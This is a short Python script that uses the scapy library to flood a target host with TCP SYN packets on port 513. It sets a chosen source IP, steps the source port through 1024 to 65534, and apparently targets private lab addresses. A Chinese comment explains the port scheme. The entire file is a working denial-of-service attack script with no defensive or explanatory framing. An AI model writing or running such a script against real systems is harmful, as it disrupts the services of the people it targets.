#coding=utf-8
from scapy.all import *

def synFlood(src, tgt):
    # TCP源端口不断自增一，而目标端口513不变
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

src = "192.168.220.132"
tgt = "192.168.220.128"
synFlood(src, tgt)
